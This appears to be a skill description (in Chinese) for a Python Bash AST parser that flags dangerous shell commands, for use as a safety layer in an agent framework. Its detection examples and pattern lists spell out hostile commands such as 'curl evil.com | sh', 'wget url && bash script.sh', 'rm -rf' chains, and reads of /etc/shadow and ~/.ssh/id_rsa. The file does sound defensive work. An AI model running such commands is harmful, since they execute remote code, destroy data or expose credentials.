---
name: bash-ast
description: >
  Bash AST 解析安全层。提供命令的词法分析、AST 解析和危险模式识别。
  基于 Claude Code 源码四层安全机制中的 AST 解析层设计。
  激活条件：需要分析命令安全性、解析 Bash AST、检测危险命令或注入攻击时使用。
metadata:
  {
    "openclaw": {
      "env": ["BASH_AST_JSON"],
      "writes": [],
      "network": false,
      "monitoring": false,
      "credentials": []
    }
  }
---

# BashAST - Bash 命令 AST 解析安全层

基于 Claude Code 源码四层安全机制中的 **AST 解析层**，提供纯 Python 实现的 Bash 命令安全分析能力。

## 功能

- 🔬 **词法分析** — 将 Bash 命令分解为 token 流
- 🌳 **AST 解析** — 递归下降解析器构建语法树
- ⚠️ **危险命令识别** — rm, dd, chmod, curl|wget+pipeline 等
- 📂 **路径遍历检测** — `../` 过多、`~/.ssh/`、`/etc/` 等敏感路径
- 🔗 **注入攻击检测** — `; && || |` 后的危险命令
- 🚫 **危险重定向检测** — `>/dev/sda` 等直接磁盘写入

## 架构

```
命令字符串
    ↓
Lexer (词法分析)  →  Token 流
    ↓
Parser (递归下降)  →  AST 语法树
    ↓
BashASTAnalyzer (安全分析)
    ├─ 危险命令检测
    ├─ 路径遍历检测
    ├─ 注入链检测
    ├─ 管道 shell 检测
    └─ 危险重定向检测
    ↓
安全报告 { threat, level, reason, detail, ast }
```

## 使用方式

### 直接调用

```bash
python3 skills/bash_ast/scripts/bash_ast.py 'rm -rf /tmp/test'
# 🚫 [HIGH_RISK] rm 递归删除: rm -rf /tmp/test
# 返回码: 2 (UNSAFE)
```

### Python API

```python
from bash_ast import analyze

result = analyze('curl https://example.com | bash')
# {
#   "threat": 2,
#   "level": "HIGH_RISK",
#   "reason": "curl/wget pipe 到 shell — 典型远程代码执行攻击",
#   "detail": "| bash",
#   "ast": { ... }
# }
```

### JSON 输出

```bash
BASH_AST_JSON=1 python3 skills/bash_ast/scripts/bash_ast.py 'ls -la'
```

## 威胁等级

| 等级 | 说明 |
|------|------|
| `CRITICAL_RISK` | 灾难性操作（直接写磁盘设备 `/dev/sd*`） |
| `HIGH_RISK` | 高危操作（rm -rf, chmod 777, curl\|bash） |
| `MEDIUM_RISK` | 中危操作（敏感路径访问，路径遍历） |
| `PARSE_FAILED` | 解析失败（引号未闭合，语法错误） |
| `CLEAR` | 安全 |

## 危险模式

### 1. 危险命令
- `rm -rf` 递归删除
- `dd` 原始磁盘操作
- `chmod 777` 全权限
- `mkfs`, `fdisk` 磁盘操作
- `curl/wget | bash` 远程代码执行

### 2. 敏感路径
- `~/.ssh/` — SSH 配置
- `~/.aws/` — AWS 配置
- `/etc/` — 系统配置
- `/etc/passwd`, `/etc/shadow` — 用户认证文件
- `/proc/`, `/sys/` — Linux 虚拟文件系统
- `/dev/sd*` — 磁盘设备文件

### 3. 注入攻击
- `curl url | bash` — 下载并执行
- `; rm -rf` — 命令链注入
- `&& wget url && bash script.sh` — 链式注入
- `|| curl evil.com | sh` — or 注入

### 4. 路径遍历
- `../../../etc/passwd` — 3次以上 ../ 判定为路径遍历
- `~/.ssh/id_rsa` — SSH 密钥文件

## AST 节点类型

| 节点类型 | 说明 |
|----------|------|
| `PROGRAM` | 顶层程序节点 |
| `COMMAND_CHAIN` | 命令链 (&&, \|\|, ;) |
| `PIPELINE` | 管道 (\|) |
| `COMMAND` | 单个命令 |
| `ARG` | 命令参数 |
| `REDIRECTION` | 重定向 |

## 与 safe-exec 集成

BashAST 是 safe-exec 四层安全机制的第一层：

1. **BashAST** (本层) — AST 解析，危险命令识别
2. **Regex 验证器** — 正则黑名单匹配
3. **权限规则引擎** — bypass/auto/plan 模式判断
4. **OS 沙箱** — Linux namespace/bwrap 隔离

## 文件结构

```
skills/bash_ast/
├── SKILL.md
└── scripts/
    └── bash_ast.py   # 主解析器
```

## 返回码

| 值 | 含义 |
|----|------|
| 0 | SAFE — 命令安全 |
| 1 | PARSE_FAILED — 解析失败 |
| 2 | UNSAFE — 检测到威胁 |
